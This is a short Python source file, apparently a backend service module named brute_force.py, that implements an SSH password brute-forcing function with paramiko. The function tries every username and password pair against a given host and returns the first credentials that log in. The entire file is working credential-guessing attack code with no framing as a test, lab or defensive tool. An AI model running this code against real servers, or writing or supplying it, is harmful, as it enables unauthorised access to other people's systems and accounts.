# backend/services/brute_force.py

import paramiko
import socket

def ssh_brute_force(host: str, port: int, usernames: list, passwords: list, timeout=5) -> dict:
    result = {"success": None, "attempts": 0, "log": []}

    for username in usernames:
        for password in passwords:
            result["attempts"] += 1
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(host, port=port, username=username, password=password, timeout=timeout)
                ssh.close()
                result["success"] = {"username": username, "password": password}
                return result
            except (paramiko.AuthenticationException, socket.error):
                result["log"].append(f"Failed: {username}/{password}")
                continue

    return result
